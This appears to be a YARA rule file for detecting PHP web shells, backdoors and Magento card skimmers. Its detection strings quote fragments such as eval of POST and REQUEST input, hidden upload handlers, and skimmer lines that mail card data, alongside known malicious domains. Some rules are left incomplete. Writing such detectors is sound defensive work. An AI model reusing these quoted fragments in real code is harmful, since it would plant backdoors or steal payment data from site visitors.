		date = "2016-01-18"
		hash = "330d7996b806be10d707b58c4f38f3b9a982841b9662a318f83eb6958e3a3b5b"
	strings:
		$s0 = "@$GLOBALS[$GLOBALS['t7b7'][1].$GLOBALS['t7b7'][65].$GLOBALS['t7b7'][85].$GLOBALS['t7b7'][58]](0);" fullword ascii
		$s1 = "$GLOBALS[$GLOBALS['t7b7'][74].$GLOBALS['t7b7'][8].$GLOBALS['t7b7'][26].$GLOBALS['t7b7'][70].$GLOBALS['t7b7'][77].$GLOBALS['t7b7'" ascii
		$s2 = "$GLOBALS[$GLOBALS['t7b7'][16].$GLOBALS['t7b7'][70].$GLOBALS['t7b7'][70].$GLOBALS['t7b7'][8].$GLOBALS['t7b7'][65].$GLOBALS['t7b7'" ascii
		$s3 = "elseif ($qe971b6cd[$GLOBALS['t7b7'][85]] == $GLOBALS['t7b7'][58])" fullword ascii
		$s4 = "$p0c25b9e4 = $y57e654f;" fullword ascii
		$s5 = "$p0c25b9e4 = NULL;" fullword ascii
		$s6 = "if ($qe971b6cd[$GLOBALS['t7b7'][85]] == $GLOBALS['t7b7'][55])" fullword ascii
		$s7 = "$qe971b6cd = @$GLOBALS[$GLOBALS['t7b7'][58].$GLOBALS['t7b7'][15].$GLOBALS['t7b7'][70].$GLOBALS['t7b7'][65].$GLOBALS['t7b7'][8].$" ascii
		$s8 = "function m6ccdd5c6($qe971b6cd, $y57e654f)" fullword ascii
		$s9 = "function j05634($qe971b6cd, $y57e654f)" fullword ascii
		$s10 = "eval($qe971b6cd[$GLOBALS['t7b7'][23]]);" fullword ascii
		$s11 = "$qe971b6cd = $a66882fb;" fullword ascii
		$s12 = "$ab3b1035 = Array(" fullword ascii
		$s13 = "$qe971b6cd = NULL;" fullword ascii
		$s14 = "$w5558de = \"\";" fullword ascii
		$s15 = "global $iad71ed;" fullword ascii
		$s16 = "if (!$qe971b6cd)" fullword ascii
		$s17 = "return $w5558de;" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 36KB and all of them
}
rule TiGERMTE
{
strings:
   $1="TiGER-M@TE" nocase

condition:
  any of them
}
rule IndoXploit
{
strings:
   $1="IndoXploit" nocase

condition:
  any of them
}
rule Backd00r
{
strings:
   $1="Backd00r"

condition:
  any of them
}
rule magento_cc_hack_obfuscated
{
strings:
   $1="YXJkaWFuc3lhaDI1MDk5NkBnbWFpbC5jb20" nocase

condition:
  any of them
}
rule magento_ftp_backdoor
{
strings:
   $1="$ftplogin = ftp_login($ftpConn,$ftpuser,$ftppassword);" nocase

condition:
  any of them
}
rule php_backdoor15
{
strings:
   $1="Andela1C3" nocase

condition:
  any of them
}
rule php_backdoor12
{
strings:
   $1="k4l0nk" nocase

condition:
  any of them
}
rule php_backdoor14
{
strings:
   $1="Dark Shell" nocase

condition:
  any of them
}
rule php_backdoor13
{
strings:
   $1="(Web Shell by oRb)" nocase

condition:
  any of them
}
rule php_malware
{
strings:
   $1="r0b0t Dd0s Php" nocase

condition:
  any of them
}
rule eval_request
{
strings:
   $1="eval(stripslashes($_REQUEST" nocase
   $2="($_=@$_REQUEST[q])" nocase

condition:
  any of them
}
rule php_backdoor11
{
strings:
   $1="b374k-shell" nocase

condition:
  any of them
}
rule magento_cc_hack_amasty
{
		meta:
			author = "martys"
			description = "possible customer login registration hack"
		strings:
			$1="amasty.biz"
		condition:
			any of them

}
rule magento_cc_hack_ebiz
{
		meta:
			author = "martys"
			description = "possible customer login registration hack"
		strings:
			$1="ebizmart.biz"
		condition:
			any of them

}
rule magento_php_backdoor
{
strings:
   $1="<?php $wp__l_='"

condition:
  any of them
}
rule magento_get_backdoor
{
strings:
$1="$_POST['fack']));"
condition:
any of them

}
rule cookie_backdoor
{
meta:
 description="cookie file usually means malware in some dir"
strings:
$1="Netscape HTTP Cookie File"

condition:
any of them

}
rule phpbackdoor_filesman_obfuscated
{
meta:
 description="backdoor shell"
strings:
$1="eval(gzinflate(base64_decode(strrev("

condition:
any of them

}
rule magento_cc_hack
{
meta:
 description="Cc.php Hacks"
strings:
$1="$serverboss = $_SERVER['SERVER_NAME'];"
$2="private function _saveInfos()"
$3="'info' => base64_encode($dvs),"
$4="$subject = $pay->getCcNumber().\" From \".$_SERVER['HTTP_HOST'].\"|\".$setBilling['Country'];"
$5="private function _storeInfos("
$6="mail($encode, $salt, $payfull, $headr);"
$7="From: Logger CC Magento"
$8="http://www.binlist.net/json/"
$10="fwrite($write,$invoice"
$11="http://www.telize.com/geoip/\".$ipboss"
$12="$idkey  = \"base\".\"64\".\"_\".\"de\".\"code\";"
$13="tuyulnya.penjahat@gmail.com"
$14="$message=\"$owner\n$ccnumber\n$expmont\n$expyear\n$issue\n$ip\";"
$15="kun.cahyono81@gmail.com"
$16="fputs($logme, $line, strlen($line));"
$17="$curl_connection = curl_init('http://www.gamesmart.mx"
$18="$encode = $idkey(\"ZGVtYWl3YWxkNDA0QGdtYWlsLmNvbQ==\");"
$19="magentopatchupdate.com"
$20="$headr  = 'From:'.$srvadd.'<'.$data2.'>';"
$21="RieqyNS13"
$22="$message .=\"Location = \".$data17->geoplugin_city"
$23="$idkey  = 'YmVnYWxtYWdlbnRvQGdtYWlsLmNvbQ==';"
$24="http://bins.pro"
$25="mVzdWx0YmFydTY5QGdtYWlsLmNvbQ=="
$27="https://bins.ribbon.co"
$28="Cassaprodigy"
$29="specialsok.tgz"


condition:
any of them
}
rule wordpress_cnf
{
meta:
 description="backdoor shell"
strings:
$1="$WP__WP='base'.(128/2).'_de'"

condition:
any of them

}
rule magento_session_php_hack
{
meta:
 description="backdoor shell"
strings:
$1="cnJvcnJwb3J0QGdtYWlsLmNvbQ"
$2="REMOTE_ADDR"
$3="US: $username\nPS: $password\nIP: $ips\nWS: $srv"
condition:
all of them
}
rule magento_prototype_js_injection
{
meta:
 description="js injection"
strings:
$1="this['eval'](String['fromCharCode']'"

condition:
any of them

}
rule md5_64651cede2467fdeb1b3b7e6ff3f81cb
{
    strings: $ = "rUl6QttVEP5eqf9usxfJjgoOvdNWFSGoHDgluk+4ONwXQNbGniQLttfyrgkB8d9"
    condition: any of them

}
rule fopo_webshell
{
    strings: 
        $ = "DNEcHdQbWtXU3dSMDA1VmZ1c29WUVFXdUhPT0xYb0k3ZDJyWmFVZlF5Y0ZEeHV4K2FnVmY0OUtjbzhnc0"
        $ = "U3hkTVVibSt2MTgyRjY0VmZlQWo3d1VlaFJVNVNnSGZUVUhKZXdEbGxJUTlXWWlqWSt0cEtacUZOSXF4c"
        $ = "rb2JHaTJVdURMNlhQZ1ZlTGVjVnFobVdnMk5nbDlvbEdBQVZKRzJ1WmZUSjdVOWNwWURZYlZ0L1BtNCt"
    condition: any of them

}
rule eval_post
{
    strings:
        $ = "eval(base64_decode($_POST"
        $ = "eval($undecode($tongji))"
        $ = "eval($_POST"
    condition: any of them

}
rule spam_mailer
{
    strings:
        $ = "<strong>WwW.Zone-Org</strong>"
        $ = "echo eval(urldecode("
    condition: any of them

}
rule md5_0105d05660329704bdb0ecd3fd3a473b
{
    /*

}
rule md5_0b1bfb0bdc7e017baccd05c6af6943ea
{
	/*
		eval(hnsqqh($llmkuhieq, $dbnlftqgr));?>
		eval(vW91692($v7U7N9K, $v5N9NGE));?>
    */
    strings: $ = /eval([wd]+($[wd]+, $[wd]+));/
    condition: any of them

}
rule md5_2495b460f28f45b40d92da406be15627
{
    strings: $ = "$dez = $pwddir.\"/\".$real;copy($uploaded, $dez);"
    condition: any of them

}
rule md5_3ccdd51fe616c08daafd601589182d38
{
    strings: $ = "eval(xxtea_decrypt"
    condition: any of them

}
rule md5_4b69af81b89ba444204680d506a8e0a1
{
    strings: $ = "** Scam Redirector"
    condition: any of them

}
rule md5_87cf8209494eedd936b28ff620e28780
{
    strings: $ = "curl_close($cu);eval($o);};die();"
condition: any of them
}
rule md5_c647e85ad77fd9971ba709a08566935d
{
    strings: $ = "fopen(\"cache.php\", \"w+\")"
    condition: any of them

}
rule md5_fb9e35bf367a106d18eb6aa0fe406437
{
    strings: $ = "0B6KVua7D2SLCNDN2RW1ORmhZRWs/sp_tilang.js"
    condition: any of them

}
rule md5_8e5f7f6523891a5dcefcbb1a79e5bbe9
{
strings: $ = "if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])) {echo '<b>up!!!</b><br><br>';}}"
condition: any of them
}
rule indoexploit_autoexploiter
{
    strings: $ = "echo \"IndoXploit - Auto Xploiter\""
    condition: any of them

}
rule eval_base64_decode_a
{
    strings: $ = "eval(base64_decode($a));"
    condition: any of them

}
rule md5_ab63230ee24a988a4a9245c2456e4874
{
    strings: $ = "eval(gzinflate(base64_decode(str_rot13(strrev("
    condition: any of them

}
rule md5_b579bff90970ec58862ea8c26014d643
{
strings: $ = /<Files [^>]+.(jpg|png|gif)>\s*ForceType application\/x-httpd-php/
condition: any of them
}
rule md5_d30b23d1224438518d18e90c218d7c8b
{
    strings: $ = "attribute_code=0x70617373776f72645f68617368"
    condition: any of them

}
rule base64_hidden_in_image
{
    strings: $ = /JPEG-1\.1[a-zA-Z0-9\-\/]{32}/
condition: any of them
}
rule hide_data_in_jpeg
{
    strings: $ = /file_put_contents\(\$.{2,3},'JPEG-1\.1'\.base64_encode/
condition: any of them
}
rule hidden_file_upload_in_503
{
    strings: $ = /error_reporting(0);$f=$_FILES[w+];copy($f[tmp_name],$f[name]);error_reporting(E_ALL);/
    condition: any of them

}
rule md5_fd141197c89d27b30821f3de8627ac38
{
    condition: any of them

}
rule md5_39ca2651740c2cef91eb82161575348b
{
    strings: $ = /if\(md5\(@\$_COOKIE\[..\]\)=='.{32}'\) \(\$_=@\$_REQUEST\[.\]\).@\$_\(\$_REQUEST\[.\]\);/
condition: any of them
}
rule md5_6eb201737a6ef3c4880ae0b8983398a9
{
    strings:
        $ = "if(md5(@$_COOKIE[qz])=="
        $ = "($_=@$_REQUEST[q]).@$_($_REQUEST[z]);"
    condition: all of them

}
rule md5_d201d61510f7889f1a47257d52b15fa2
{
    strings: $ = "@eval(stripslashes($_REQUEST[q]));"
    condition: any of them

}
rule onepage_or_checkout
{
    strings: $ = "\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74"
    condition: any of them

}
rule sinlesspleasure_com
{
    strings: $ = "5e908r948q9e605j8t9b915n5o9f8r5e5d969g9d795b4s6p8t9h9f978o8p8s9590936l6k8j9670524p7490915l5f8r90878t917f7g8p8o8p8k9c605i8d937t7m8i8q8o8q959h7p828e7r8e7q7e8m8o5g5e9199918o9g7q7c8c8t99905a5i8l94989h7r7g8i8t8m5f5o92917q7k9i9e948c919h925a5d8j915h608t8p8t9f937b7k9i9e948c919h92"
    condition: any of them

}
rule amasty_biz
{
    strings: $ = "118,97,114,32,115,110,100,32,61,110,117,108,108,59,10,10,102,117"
    condition: any of them

}
rule amasty_biz_js
{
    strings: $ = "t_p#0.qlb#0.#1Blsjj#1@#.?#.?dslargml#0.qr_pr#06#07#5@#.?#0"
    condition: any of them

}
rule returntosender
{
    strings: $ = "\x2F\x6D\x65\x64\x69\x61\x2F\x63\x61\x74\x61\x6C\x6F\x67\x2F\x70\x72\x6F\x64\x75\x63\x74\x2F\x63\x61\x63\x68\x65\x2F\x31\x2F\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C\x2F\x37\x30\x30\x78\x2F\x32\x62\x66\x38\x66\x32\x62\x38\x64\x30\x32\x38\x63\x63\x65\x39\x36\x2F\x42\x2F\x57\x2F\x64\x61\x34\x31\x38\x30\x33\x63\x63\x39\x38\x34\x62\x38\x63\x2E\x70\x68\x70"
    condition: any of them

}
rule ip_5uu8_com
{
    strings: $ = "\x69\x70\x2e\x35\x75\x75\x38\x2e\x63\x6f\x6d"
    condition: any of them

}
rule cloudfusion_me
{
    strings: $ = "&#99;&#108;&#111;&#117;&#100;&#102;&#117;&#115;&#105;&#111;&#110;&#46;&#109;&#101;"
    condition: any of them

}
rule grelos_v
{
    strings: $ = "var grelos_v"
    condition: any of them

}
rule hacked_domains
{
    strings: 
        $ = "infopromo.biz"
        $ = "jquery-code.su"
        $ = "jquery-css.su"
        $ = "megalith-games.com"
        $ = "cdn-cloud.pw"
        $ = "animalzz921.pw"
    condition: any of them

}
rule mage_cdn_link
{
    strings: $ = "\x6D\x61\x67\x65\x2D\x63\x64\x6E\x2E\x6C\x69\x6E\x6B"
    condition: any of them

}
rule credit_card_regex
{
    strings: $ = "RegExp(\"[0-9]{13,16}\")"
condition: any of them
}
rule jquery_code_su
{
    strings: $ = "105,102,40,40,110,101,119,32,82,101,103,69,120,112,40,39,111,110,101,112,97,103,101"
    condition: any of them

}
rule jquery_code_su_multi
{
    strings: $ = "=oQKpkyJ8dCK0lGbwNnLn42bpRXYj9GbENDft12bkBjM8V2Ypx2c8Rnbl52bw12bDlkUVVGZvNWZkZ0M85WavpGfsJXd8R1UPB1NywXZtFmb0N3box"
    condition: any of them

}
rule gate_php_js
{
    strings: 
		$ = "/gate.php?token="
		$ = "payment[cc_cid]"
    condition: all of them

}
rule googieplay_js
{
    strings: $ = "tdsjqu!tsd>#iuuq;00hpphjfqmbz/jogp0nbhfoup`hpphjfqmbz/kt#?=0tdsjqu?"
    condition: any of them

}
rule mag_php_js
{
    strings: $ = "onepage|checkout|onestep|firecheckout|onestepcheckout"
    condition: any of them

}
rule thetech_org_js
{
    strings: $ = "|RegExp|onepage|checkout|"
    condition: any of them

}
rule md5_cdn_js_link_js
{
    strings: $ = "grelos_v= null"
    condition: any of them

}
rule backup_backdoor
{
    strings:
        $ = "function onESs($NTlWmu)"
    condition: any of them

}
rule mailhijacker
{
    strings:
        $ = "public function check($email, $pwd){"
    condition: any of them

}
rule adminhijacker
{
    strings:
        $ = "\"Admin From \".$_SERVER['HTTP_HOST']"
    condition: any of them

}
rule modgit_backdoor
{
    strings:
        $ = "isset($_POST['_']))@setcookie('_', $_POST['_']);"
    condition: any of them

}